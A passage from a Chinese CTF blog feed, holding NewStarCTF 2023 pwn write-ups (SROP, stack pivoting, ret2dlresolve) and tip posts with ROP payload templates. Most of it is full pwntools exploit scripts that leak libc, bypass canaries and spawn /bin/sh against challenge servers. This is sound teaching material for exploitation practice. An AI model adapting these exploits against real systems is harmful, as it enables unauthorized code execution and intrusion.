class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret      = libc_base + <span class="number">0x2a264</span> </span><br><span class="line">pop_rdi  = libc_base + <span class="number">0x2a3e5</span> </span><br><span class="line">pop_rsi  = libc_base + <span class="number">0x2be51</span> </span><br><span class="line">pop_rdx  = libc_base + <span class="number">0x90529</span>     </span><br><span class="line">pop_rax  = libc_base + <span class="number">0x45eb0</span> </span><br><span class="line">read     = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]     <span class="comment"># elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) \</span><br><span class="line">    + p64(pop_rdi) + p64(<span class="number">0</span>) \</span><br><span class="line">    + p64(pop_rsi) + p64(<span class="number">0x66660000</span>) \</span><br><span class="line">    + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(read) \</span><br><span class="line">    + p64(<span class="number">0x66660000</span>)   <span class="comment"># 套路，你应该懂吧</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x66660200</span>,<span class="number">0x100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x66660200</span>,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(orw_shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="srop">srop</span></h2><p>老规矩查看一下保护机制，只打开了 NX，并且是 full RELRO（got.plt 均不可读可写），不懂可看 <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a>，srop 的方法可以套模板，利用系统调用号（可以看看这里 <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! 技巧 (3)</a>）</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/8.png"></p>
<p>ida 一下，发现发生了栈溢出，但溢出长度不够构造 rop，因此需要栈迁移。这类题目格式模板化，就是考察你 srop 的用法，套模板，注意一些参数就行，后续我会更新该题型模板，敬请期待！</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/9.png"></p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29475</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall = elf.plt[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">rdi     = <span class="number">0x401203</span></span><br><span class="line">lea     = <span class="number">0x401171</span>              <span class="comment"># lea     rax, [rbp+var_30]</span></span><br><span class="line">bss     = <span class="number">0x404050</span> + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome to srop!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">59</span></span><br><span class="line">frame.rsi = bss - <span class="number">0x30</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rcx = <span class="number">0</span></span><br><span class="line">frame.rsp = bss + <span class="number">0x38</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + flat(bss, lea)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + flat(rdi,<span class="number">15</span>,syscall,frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="stack-migration-revenge">stack migration revenge</span></h2><p>查看一下保护机制，打开了 NX</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/10.png"></p>
<p>ida 反汇编，你会发现相较上一周的栈迁移题，这次需要自己构造迁移地点，难度上升一个档次，理解较难。我理解是在 read 地址写入 rop，再栈迁移到 bss 段，剩下套路。注意接收，这真的很坑，掉几次！☻☻☻</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/11.png"></p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26731</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr   = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">plt_addr   = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">bss        = elf.bss(<span class="number">0x700</span>)       <span class="comment"># 0x404100</span></span><br><span class="line">rdi_addr   = <span class="number">0x4012b3</span></span><br><span class="line">rbp_addr   = <span class="number">0x40115d</span></span><br><span class="line">leave_ret  = <span class="number">0x401227</span></span><br><span class="line">ret_addr   = <span class="number">0x40101a</span></span><br><span class="line">read       = <span class="number">0x4011FF</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;just chat with me:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span> + p64(bss +<span class="number">0x50</span>) + p64(read)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;so funny\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr) + p64(got_addr) + p64(plt_addr)</span><br><span class="line">payload += p64(rbp_addr) + p64(bss +<span class="number">0x800</span>) + p64(read)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(bss -<span class="number">0x8</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;so funny\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr   = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh     = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(bss +<span class="number">0x800</span> -<span class="number">0x58</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="dlresolve">dlresolve</span></h2><p>这题是 ret2dlresolve 的解法，在比赛中较少碰到，我第一次接触，原理还在理解中，先挂官方 WP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27108</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x401170</span></span><br><span class="line">plt0 = <span class="number">0x401020</span>  <span class="comment"># plt 段地址</span></span><br><span class="line">bss = <span class="number">0x404040</span></span><br><span class="line">bss_stage = bss + <span class="number">0x100</span></span><br><span class="line">l_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000040115e</span>    <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000040116b</span>    <span class="comment"># pop rsi ; ret # 用于解析符号 dl_runtime_resolve</span></span><br><span class="line">plt_load = p64(plt0 + <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr, known_func_ptr, offset</span>):</span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))  <span class="comment"># l_addr</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>)</span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>)</span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, read_got, l_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span>,</span><br><span class="line">    pop_rdi, <span class="number">0</span>,</span><br><span class="line">    pop_rsi, bss_stage,</span><br><span class="line">    read_plt,</span><br><span class="line">    pop_rsi, <span class="number">0</span>,</span><br><span class="line">    pop_rdi, bss_stage + <span class="number">0x48</span>,</span><br><span class="line">    plt_load, bss_stage, <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="总结">总结：</span></h1><p>这次题目确实上了一个档次，有些东西确实也不太好理解，慢慢来，积少成多，相同题型放一起总结，总会得出好的结论，就一句话：多做多总结，冲冲冲！！！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>NewStarCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN PWN PWN !!! 技巧 (1)</title>
    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/</url>
    <content><![CDATA[<p>PWN PWN PWN !!! 技巧 (1)</p>
<span id="more"></span>

<h1><span id="简介">简介：</span></h1><p>记录一下，基础的知识点和一些工具的用法，解题模板等（本人记性差时不时会忘记，记录一下与大家共勉）</p>
<hr>
<h2><span id="32位传参">32位传参</span></h2><p>32位传参的方式是通过栈来传参的，与构造的payload也是有关的，大致如下：(有时候也会变根据题目意思来)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = 填充的数据 + system + 垃圾数据 + binsh</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="64位传参">64位传参</span></h2><p>64位传参前六个参数是通过寄存器来传参的，分别为 rdi、rsi、rdx、rcx、r8、r9，之后的参数是通过栈传递的，同样构造 payload 也有一套，但还是需要具体问题具体分析，大致如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = 填充的数据 + rdi + binsh + system</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="32位泄露libc之puts">32位泄露libc之puts</span></h2><p>这里只写构造 payload 的大体模板，其他的都是通式做多了就知道了（填充的数据是可以变的啊，main_addr 也就是你需要返回的地址）</p>
<p><strong>第一次 payload 泄露 libc：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(main_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p><strong>第二次 payload 获得 shell：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="64位泄露libc之puts">64位泄露libc之puts</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_addr)</span><br></pre></td></tr></table></figure>

<p><strong>第二次 payload 得 shell：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="32位泄露libc之write">32位泄露libc之write</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p><strong>第二次 payload 获得 shell：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="64位泄露libc之write">64位泄露libc之write</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(main_addr)</span><br></pre></td></tr></table></figure>

<p><strong>第二次 payload 得 shell：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="泄露libc之有libc文件">泄露libc之有libc文件</span></h2><p>给 fresh pwner 提醒下，这里的 puts 是可以换的（看你是通过 puts 函数泄露的还是通过 write 函数泄露的，通过哪个写哪个）仔细观察有无 libc 文件的区别（发现没中小括号也是要区分的哦，可以自己试试）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="泄露libc之无libc文件">泄露libc之无libc文件</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="canary">Canary</span></h2><p><strong>第一次泄露 libc：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(vuln)</span><br></pre></td></tr></table></figure>

<p><strong>第二次获得 shell：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="relro">Relro</span></h2><ol>
<li>RELRO 防御策略：<ul>
<li>NO RELRO：<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code> 均可读可写</li>
<li>PARTIAL RELRO：<code>init.array</code>、<code>fini.array</code> 可读不可写，<code>got.plt</code> 可读可写</li>
<li>FULL RELRO：<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code> 均可读不可写</li>
</ul>
</li>
<li>Linux 程序运行时：<ul>
<li>在加载的时候，会依次调用 <code>init.array</code> 数组中的每一个函数指针</li>
<li>在结束的时候，依次调用 <code>fini.array</code> 中的每一个函数指针</li>
</ul>
</li>
<li>当程序出现格式化字符串漏洞，但是至少需要写两次才能完成攻击。<ul>
<li>当少于两个输入点时，可以考虑改写 <code>fini.array</code> 中的函数指针为 <code>main</code> 函数地址，可以再执行一次 <code>main</code> 函数。</li>
<li>一般来说，这个数组的长度为 1，也就是说只能写一个地址。</li>
</ul>
</li>
</ol>
<hr>
<h1><span id="总结">总结：</span></h1><p>多做 pwn，多总结，加油，冲冲冲！！！</p>
]]></content>
      <categories>
        <category>技巧</category>
        <category>方法</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN PWN PWN !!! 技巧 (2)</title>
    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(2)/</url>
    <content><![CDATA[<p>PWN PWN PWN !!! 技巧 (2)</p>
<span id="more"></span>

<h1><span id="简介">简介：</span></h1><p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a></p>
<p>紧接上次技巧（1），这次总结一些工具的用法和模板，俗话说好记性不如烂笔头，记录一手</p>
<hr>
<h2><span id="环境">环境</span></h2><p>32位：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,<span class="built_in">arch</span> = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>64位：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">context( log_level = <span class="string">&#x27;debug&#x27;</span>,<span class="built_in">arch</span> = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span> )</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="查找程序所动态链接的库">查找程序所动态链接的库</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldd 文件名</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/1.png"></p>
<hr>
<h2><span id="ropgadget">ROPgadget</span></h2><p>在构造rop链的时候，需要一些寄存器的地址，就可以用下面的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary 文件名 | grep <span class="string">&#x27;ret&#x27;</span>    <span class="comment">#注意ret是可以改成别的欧，像rdi,rsi寄存器啥的</span></span><br></pre></td></tr></table></figure>

<p>在遇到静态链接的时候，往往用ROPgadget搜索就会出现一大堆地址，这个时候就需要区分一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&quot;pop|ret&quot;</span> | grep <span class="string">&#x27;eax&#x27;</span>   <span class="comment">#根据自己的需要进行改动</span></span><br></pre></td></tr></table></figure>

<p>如果是做ret2syscall就需要binsh，in 0x80，就用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;/bin/sh&#x27;</span> </span><br><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;sh&#x27;</span></span><br><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;int 0x80&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ROPgadget还可以直接构造rop链（主要争对的是静态链接）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --ropchain</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/2.png"></p>
<h2><span id="32位">32位</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = b<span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea060) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080b8016) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += b<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea064) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080b8016) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += b<span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080492d3) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080481c9) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea060) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080de769) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080492d3) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0806c943) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure>

<h2><span id="64位">64位</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = b<span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000040a30d) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000049d0c0) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000419a1c) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += b<span class="string">&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000041ac41) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000040a30d) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000049d0c8) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000417e25) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000041ac41) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000401d1d) 